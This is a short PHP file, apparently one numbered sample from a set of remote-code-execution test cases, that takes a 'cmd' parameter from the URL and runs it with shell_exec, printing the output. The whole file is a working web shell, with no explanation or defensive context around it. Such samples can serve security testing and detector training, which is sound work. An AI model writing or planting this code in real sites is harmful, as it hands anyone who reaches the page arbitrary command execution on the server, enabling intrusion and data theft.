<?php
// RCE test variation #513
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>